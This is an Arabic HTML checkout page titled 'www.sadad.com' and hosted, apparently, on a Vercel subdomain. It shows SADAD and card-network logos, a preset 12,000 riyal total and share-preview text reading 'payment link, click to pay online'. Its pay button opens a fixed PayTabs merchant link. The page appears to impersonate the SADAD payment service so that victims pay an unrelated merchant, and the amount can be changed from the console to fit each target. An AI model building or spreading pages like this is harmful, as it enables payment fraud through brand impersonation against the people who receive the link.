<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>www.sadad.com</title>
    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap" rel="stylesheet">
    <!-- SEO Description -->
    <meta name="description" id="metaDescription" content="رابط دفع بملغ SRA 12,000.00 انقر للدفع اونلاين ">

    <!-- Open Graph (Facebook / WhatsApp / LinkedIn) -->
    <meta property="og:title" content="www.sadad.com">
    <meta property="og:description" id="ogDescription" content="رابط دفع بملغ SRA 12,000.00 انقر للدفع اونلاين ">
    <meta property="og:type" content="website">
    <meta property="og:url" content="https://sadad-tau.vercel.app"> <!-- ضع رابط صفحتك -->
    <meta property="og:image" content="https://sadad-tau.vercel.app/sadad.jpg"> <!-- رابط الصورة -->
    <meta property="og:locale" content="ar_AR">

    <!-- Twitter Card -->
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="www.sadad.com">
    <meta name="twitter:description" id="twitterDescription" content="رابط دفع بملغ SRA 12,000.00 انقر للدفع اونلاين ">
    <meta name="twitter:image" content="https://sadad-tau.vercel.app/sadad.jpg">
    <style>
        :root {
            --primary-bg: #fdfdfd;
            --secondary-bg: #f4f6f8;
            --accent-purple: #5b54a3;
            --text-dark: #333;
            --text-gray: #777;
            --border-color: #e0e0e0;
            --orange-status: #f39c12;
        }

        body {
            font-family: 'Tajawal', sans-serif;
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: flex-start;
            min-height: 100vh;
            margin: 0;
            color: var(--text-dark);
            padding: 20px;
        }

        .checkout-card {
            background: white;
            width: 100%;
            max-width: 450px;
            padding: 25px;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
            box-sizing: border-box;
        }

        /* قسم المبالغ */
        .summary-box {
            background-color: var(--secondary-bg);
            border-radius: 10px;
            padding: 20px;
            margin-bottom: 25px;
            position: relative;
        }

        .summary-row {
            display: flex;
            justify-content: space-between;
            font-size: 14px;
            color: var(--text-gray);
            margin-bottom: 10px;
        }

        .total-title {
            font-size: 20px;
            font-weight: 700;
            margin: 10px 0 5px 0;
        }

        .total-amount {
            font-size: 26px;
            font-weight: 800;
            margin-bottom: 10px;
        }

        .amount-literal {
            font-size: 12px;
            color: #888;
            line-height: 1.6;
        }

        /* قسم الدفع بالبطاقة */
        .section-title {
            font-size: 16px;
            font-weight: 600;
            margin-bottom: 15px;
            display: block;
        }

        .payment-methods {
            display: flex;
            align-items: center;
            gap: 15px;
            margin-bottom: 20px;
            background: #fff;
            padding: 10px;
            border-radius: 8px;
            border: 1px solid var(--border-color);
        }

        .payment-methods img {
            height: 24px;
            opacity: 0.8;
        }

        .apple-pay-box {
            height: 10px;
            opacity: 0.8;
        }

        .btn-pay {
            width: 100%;
            background-color: #000; 
            color: white;
            border: none;
            padding: 14px;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 10px;
            transition: background 0.3s;
        }

        .btn-pay:hover {
            background-color: white;
            color: #000 ;
            border: 1px solid #000;
            border-radius: 8px;
        }

        /* قسم سداد */
        .sadad-divider {
            text-align: center;
            margin: 25px 0;
            position: relative;
        }

        .sadad-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
        }

        .sadad-logo {
            height: 25px;
        }

        .sadad-info-box {
            font-size: 14px;
            line-height: 2;
        }

        .info-row {
            display: flex;
            justify-content: flex-start;
            gap: 10px;
            margin-bottom: 8px;
        }

        .label { color: #666; min-width: 100px; }
        .value { font-weight: 600; }

        .status-badge {
            background-color: #fff9e6;
            color: var(--orange-status);
            padding: 2px 10px;
            border-radius: 4px;
            font-size: 11px;
            border: 1px solid #ffeeba;
            margin-right: 10px;
        }
        .currency-icon {
            width: 18px;
            height: 18px;
            vertical-align: middle;
            margin-right: 6px;
            object-fit: contain;
        }
        /* تابلت */
        @media (max-width: 768px) {
            .checkout-card {
                max-width: 100%;
                padding: 20px;
            }
            .total-amount {
                font-size: 22px;
            }
            .btn-pay {
                font-size: 15px;
                padding: 12px;
            }
        }

        /* موبايل صغير */
        @media (max-width: 480px) {
            body {
                padding: 10px;
            }
            .checkout-card {
                padding: 15px;
                border-radius: 10px;
            }
            .summary-box {
                padding: 15px;
            }
            .total-title {
                font-size: 18px;
            }
            .total-amount {
                font-size: 20px;
            }
            .amount-literal {
                font-size: 11px;
            }
            .payment-methods {
                gap: 8px;
                flex-wrap: wrap;
            }
            .payment-methods img {
                height: 20px;
            }
            .btn-pay {
                font-size: 14px;
            }
        }
    </style>
</head>
<body>

<div class="checkout-card">
    <div class="summary-box">
        <div class="summary-row">
            <span>إجمالي الخصم</span>
            <span>0.00  
            <img src="riyal.svg" class="currency-icon">
            </span>
        </div>
        <div class="total-title">المجموع الكلي</div>
        <div class="total-amount" id="totalAmountDisplay">
            12,000.00
            <img src="riyal.svg" class="currency-icon" alt="ريال">
        </div>
        <div class="amount-literal" id="amountLiteral">
            اثنا عشر ألفاً ريال سعودي صفر هللات فقط
        </div>
    </div>

    <label class="section-title">الدفع عن طريق البطاقة</label>
    <div class="payment-methods">
        <img src="Visa_Inc._logo.png" alt="Visa">
        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="Mastercard">
        <img src="madaLogo.png" alt="Mada" style="height:15px">
        <img class="apple-pay-box" src="https://upload.wikimedia.org/wikipedia/commons/b/b0/Apple_Pay_logo.svg" alt="Apple Pay">
    </div>
    
    <button class="btn-pay" onclick="handleCardPayment(this)">
        ادفع عن طريق البطاقة
    </button>

    <div class="sadad-divider"></div>
    
    <div class="sadad-header">
        <span class="section-title">أو ادفع عن طريق سداد</span>
        <img src="SADAD-Logo.png" class="sadad-logo" alt="SADAD">
    </div>
</div>

<script>
// ===================== المتغير الرئيسي =====================
// قم بتغيير هذه القيمة وسيتغير كل شيء تلقائياً
let totalAmount = "12,000.00";
// =========================================================

// دالة لتحديث كل الأماكن التي تعرض المبلغ
function updateTotalAmount(value) {
    // تحديث في الشاشة (div)
    const totalDiv = document.getElementById("totalAmountDisplay");
    if (totalDiv) {
        // نحافظ على الأيقونة الموجودة داخله
        totalDiv.innerHTML = value + ' <img src="riyal.svg" class="currency-icon" alt="ريال">';
    }
    
    // تحديث الوصف النصي (الأرقام بالحروف)
    const amountLiteralSpan = document.getElementById("amountLiteral");
    if (amountLiteralSpan) {
        const numberValue = parseFloat(value);
        if (!isNaN(numberValue)) {
            amountLiteralSpan.innerText = convertNumberToArabicWords(numberValue);
        } else {
            amountLiteralSpan.innerText = value + " ريال سعودي فقط";
        }
    }
    
    // تحديث meta tags
    const metaDesc = document.getElementById("metaDescription");
    const ogDesc = document.getElementById("ogDescription");
    const twitterDesc = document.getElementById("twitterDescription");
    
    const newDesc = `رابط دفع بملغ SRA ${value} انقر للدفع اونلاين `;
    if (metaDesc) metaDesc.setAttribute("content", newDesc);
    if (ogDesc) ogDesc.setAttribute("content", newDesc);
    if (twitterDesc) twitterDesc.setAttribute("content", newDesc);
}

// دالة تحويل الأرقام إلى كلمات (للمبالغ البسيطة)
function convertNumberToArabicWords(num) {
    if (isNaN(num)) return "صفر ريال";
    let integerPart = Math.floor(num);
    let decimalPart = Math.round((num - integerPart) * 100);
    
    const ones = ["", "واحد", "اثنان", "ثلاثة", "أربعة", "خمسة", "ستة", "سبعة", "ثمانية", "تسعة"];
    const tens = ["", "عشرة", "عشرون", "ثلاثون", "أربعون", "خمسون", "ستون", "سبعون", "ثمانون", "تسعون"];
    const hundreds = ["", "مائة", "مائتان", "ثلاثمائة", "أربعمائة", "خمسمائة", "ستمائة", "سبعمائة", "ثمانمائة", "تسعمائة"];
    
    function convertLessThanThousand(n) {
        if (n === 0) return "";
        if (n < 10) return ones[n];
        if (n < 20) {
            if (n === 10) return "عشرة";
            if (n === 11) return "أحد عشر";
            if (n === 12) return "اثنا عشر";
            return ones[n - 10] + " عشر";
        }
        if (n < 100) {
            let unit = n % 10;
            let ten = Math.floor(n / 10);
            if (unit === 0) return tens[ten];
            return ones[unit] + " و" + tens[ten];
        }
        if (n < 1000) {
            let hundred = Math.floor(n / 100);
            let remainder = n % 100;
            let hundredText = hundreds[hundred];
            if (remainder === 0) return hundredText;
            return hundredText + " و" + convertLessThanThousand(remainder);
        }
        return "";
    }
    
    function convertThousands(n) {
        if (n === 0) return "";
        if (n === 1) return "ألف";
        if (n === 2) return "ألفان";
        if (n >= 3 && n <= 10) return convertLessThanThousand(n) + " آلاف";
        return convertLessThanThousand(n) + " ألف";
    }
    
    let thousandsPart = Math.floor(integerPart / 1000);
    let restPart = integerPart % 1000;
    let result = "";
    
    if (thousandsPart > 0) {
        result += convertThousands(thousandsPart);
        if (restPart > 0) result += " و";
    }
    if (restPart > 0) {
        result += convertLessThanThousand(restPart);
    }
    if (integerPart === 0) result = "صفر";
    
    result += " ريال سعودي";
    if (decimalPart > 0) {
        result += " و" + convertLessThanThousand(decimalPart) + " هللة";
    } else {
        result += " صفر هللات";
    }
    return result + " فقط";
}

// دالة لتغيير المبلغ يدوياً من أي مكان (مثلاً من console أو استدعاء خارجي)
function setTotalAmount(newAmount) {
    totalAmount = newAmount;
    updateTotalAmount(totalAmount);
}

// عند تحميل الصفحة، نطبق القيمة الأولية
window.onload = function() {
    setTotalAmount(totalAmount);
    console.log("صفحة الدفع جاهزة. المبلغ الحالي: " + totalAmount);
};

// دالة الدفع (كما هي)
function handleCardPayment(btn) {
    btn.innerText = "جاري التحويل...";
    btn.disabled = true;

    window.open(
        "https://secure.paytabs.sa/payment/link/129940/1957771",
        "_blank",
        "noopener,noreferrer"
    );

    setTimeout(function() {
        btn.innerText = "ادفع عن طريق البطاقة";
        btn.disabled = false;
    }, 3000);
}
</script>

</body>
</html>
